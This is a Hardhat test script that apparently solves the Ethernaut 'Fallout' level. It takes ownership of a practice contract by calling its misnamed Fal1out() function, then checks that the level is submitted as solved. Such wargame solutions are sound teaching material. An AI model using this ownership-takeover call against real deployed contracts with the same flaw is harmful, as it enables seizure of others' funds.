import { expect } from "chai";
import { Contract, Signer } from "ethers";
import { ethers } from "hardhat";
import { createChallenge, submitLevel } from "./utils";

let accounts: Signer[];
let eoa: Signer;
let attacker: Contract;
let challenge: Contract; // challenge contract
let tx: any;

before(async () => {
  accounts = await ethers.getSigners();
  [eoa] = accounts;
  const challengeFactory = await ethers.getContractFactory(`Fallout`);
  const challengeAddress = await createChallenge(
    `0x676e57FdBbd8e5fE1A7A3f4Bb1296dAC880aa639`
  );
  challenge = await challengeFactory.attach(challengeAddress);
});

it("solves the challenge", async function () {
  tx = await challenge.Fal1out()
  await tx.wait()
});

after(async () => {
  expect(await submitLevel(challenge.target), "level not solved").to.be.true;
});
